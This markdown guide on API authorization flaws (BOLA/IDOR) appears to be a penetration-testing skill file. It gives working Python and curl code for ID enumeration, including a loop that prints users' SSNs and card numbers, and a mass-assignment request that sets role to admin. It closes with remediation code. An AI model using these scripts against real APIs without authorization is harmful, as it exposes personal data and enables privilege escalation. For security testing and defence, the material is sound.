# API Authorization & BOLA (IDOR)

## Overview
Broken Object Level Authorization (BOLA), also known as Insecure Direct Object References (IDOR), occurs when API endpoints directly reference object IDs without proper access control verification. This skill covers comprehensive authorization bypass techniques.

## Vulnerability Categories

### 1. Sequential ID Enumeration
**Impact:** High
**Complexity:** Low

#### Technique
Objects referenced by predictable sequential IDs.

**Example:**
```
GET /api/users/1/profile
GET /api/users/2/profile  ← Can I access other users?
GET /api/users/999/profile ← Admin user?

GET /api/orders/1001
GET /api/orders/1002  ← Can I see others' orders?
GET /api/orders/1003
```

#### Detection
```bash
# Simple enumeration
for i in {1..100}; do
  curl -s "https://api.example.com/api/users/$i" -H "Authorization: Bearer $TOKEN"
done

# Look for 200 responses = accessible resources
```

#### Exploitation
```python
import requests

base_url = "https://api.example.com/api/users"
headers = {"Authorization": f"Bearer {user_token}"}

# Enumerate user profiles
for user_id in range(1, 1000):
    response = requests.get(f"{base_url}/{user_id}", headers=headers)
    if response.status_code == 200:
        data = response.json()
        print(f"[+] Found user {user_id}: {data.get('email', 'N/A')}")
        
        # Extract sensitive data
        if 'ssn' in data:
            print(f"    SSN: {data['ssn']}")
        if 'credit_card' in data:
            print(f"    Credit Card: {data['credit_card']}")
```

### 2. UUID/Hash Prediction
**Impact:** Medium to High
**Complexity:** Medium

#### Problem
Weak UUID v4 generation or predictable hashing.

**Example:**
```
GET /api/documents/550e8400-e29b-41d4-a716-446655440000
GET /api/documents/550e8400-e29b-41d4-a716-446655440001 ← Sequential UUID?
```

#### Detection
```bash
# Collect multiple IDs and analyze patterns
# If sequential: BOLA likely exists
```

#### Exploitation
```python
import uuid

# If weak UUID v4 generation (incomplete randomization)
# Attempt to generate similar UUIDs

def increment_uuid(uuid_str):
    """Try next UUID in sequence"""
    uuid_int = int(uuid.UUID(uuid_str).int)
    uuid_int += 1
    return str(uuid.UUID(int=uuid_int))
```

### 3. Mass Assignment
**Impact:** High
**Complexity:** Low

#### Technique
Modifying object properties via API parameters without authorization checks.

**Example:**
```
PUT /api/users/123
{
  "email": "attacker@evil.com",
  "role": "admin",           ← Can I modify role?
  "department": "CEO",       ← Can I escalate?
  "verified": true,          ← Can I bypass verification?
}
```

#### Exploitation
```bash
# Standard user account update
curl -X PUT "https://api.example.com/api/users/123" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "John",
    "role": "admin",
    "verified": true
  }'

# Check if role/admin fields are modifiable
```

### 4. Parameter Pollution
**Impact:** Medium
**Complexity:** Medium

#### Technique
Multiple parameters referencing objects, one unchecked.

**Example:**
```
GET /api/users/me/orders
    ?user_id=123              ← My actual ID
    &view_user_id=999         ← Unvalidated parameter!
    
Response: Orders from user 999 ✓
```

#### Exploitation
```bash
# Original: fetch my orders
GET /api/orders?user_id=me

# Bypass: fetch others' orders
GET /api/orders?user_id=me&owner_id=999
GET /api/orders?user_id=me&x-user-id=999
GET /api/orders?user_id=me&user-id=999
```

### 5. String vs Integer ID Confusion
**Impact:** Low
**Complexity:** Low

#### Technique
API accepts both types, server logic inconsistent.

**Example:**
```
# Integer ID check passes
GET /api/users/123          ← "123" == 123 check passes

# String bypasses
GET /api/users/"123"        ← String comparison fails
GET /api/users/0123         ← Octal interpretation
GET /api/users/0x7B         ← Hex interpretation
```

## Detection Methods

### 1. Manual Testing
```bash
# Capture authenticated request for own resource
GET /api/users/[YOUR_ID]/profile

# Modify ID parameter
GET /api/users/[OTHER_ID]/profile

# Check for:
# - 200 OK: BOLA confirmed
# - 403 Forbidden: Access control working
# - 404 Not Found: Resource doesn't exist or access denied
```

### 2. Automated Scanning
```python
import requests
from urllib.parse import urljoin

def test_bola(base_url, endpoint_template, auth_headers, start_id=1, count=50):
    """Test BOLA on API endpoint"""
    
    accessible_ids = []
    
    for resource_id in range(start_id, start_id + count):
        url = endpoint_template.format(id=resource_id)
        
        response = requests.get(
            urljoin(base_url, url),
            headers=auth_headers
        )
        
        if response.status_code == 200:
            accessible_ids.append(resource_id)
            print(f"[+] Accessible: {resource_id}")
        elif response.status_code == 403:
            print(f"[-] Forbidden: {resource_id}")
        elif response.status_code == 404:
            print(f"[?] Not found: {resource_id}")
    
    return accessible_ids

# Usage
auth_headers = {"Authorization": f"Bearer {token}"}
ids = test_bola(
    "https://api.example.com",
    "/api/users/{id}/profile",
    auth_headers
)
```

### 3. Intercept & Modify
Using Burp Suite:
1. Capture request to `/api/users/me/profile`
2. Send to Intruder
3. Change `me` to numbers: 1, 2, 3, ...
4. Analyze responses (200 = BOLA)

## Exploitation Chain

```
1. Identify protected resources
   - /api/users/[ID]/profile
   - /api/orders/[ID]
   - /api/documents/[ID]

2. Determine ID format
   - Sequential (1, 2, 3...)
   - UUID
   - Hash (MD5, SHA1)

3. Test authorization on own resource
   GET /api/users/me/profile (works)

4. Modify ID to other user
   GET /api/users/1/profile (works?) → BOLA!

5. Mass enumerate
   - Extract emails, PII, financial data
   - Find admin accounts
   - Discover hidden resources

6. Attempt mass assignment
   PUT /api/users/1 (change role to admin)

7. Escalate privileges if possible
```

## Impact Scenarios

**Data Exfiltration:**
- Extract all user emails → mass phishing
- Dump financial records
- Export health/personal data

**Privilege Escalation:**
- Modify `role: "admin"` on target user
- Change `verified: true` to bypass 2FA
- Update `department` to gain access

**Lateral Movement:**
- Find admin user ID (enumeration)
- Access admin dashboard
- Pivot to internal systems

## Remediation

✅ **Server-Side Fixes:**
```python
# VULNERABLE
@app.route('/api/users/<user_id>/profile')
def get_profile(user_id):
    user = User.query.get(user_id)
    return user.to_json()  # No access check!

# FIXED
@app.route('/api/users/<user_id>/profile')
@require_auth
def get_profile(user_id):
    current_user = get_current_user()
    if int(user_id) != current_user.id:
        abort(403)  # Forbidden
    user = User.query.get(user_id)
    return user.to_json()

# BETTER: Use logical owner check
def get_profile(user_id):
    current_user = get_current_user()
    user = User.query.get(user_id)
    
    # Check ownership
    if not user.can_be_viewed_by(current_user):
        abort(403)
    
    return user.to_json()
```

✅ **Best Practices:**
- Always verify authorization before returning resource
- Use object ownership checks, not just authentication
- Implement Role-Based Access Control (RBAC)
- Log all resource access attempts
- Use UUIDs v4 (proper randomization) for IDs
- Disable field modification for sensitive properties via API
- Implement rate limiting on enumeration endpoints

## References
- [OWASP BOLA](https://owasp.org/www-community/attacks/Insecure_Direct_Object_References)
- [API Security Top 10 #1](https://owasp.org/www-project-api-security/latest/docs/en/v3.0.1/intro.html)
- [HackerOne IDOR Reports](https://hackerone.com/reports?report_type=vulnerability&vulnerability_type=Insecure%20Direct%20Object%20Reference%20(IDOR))
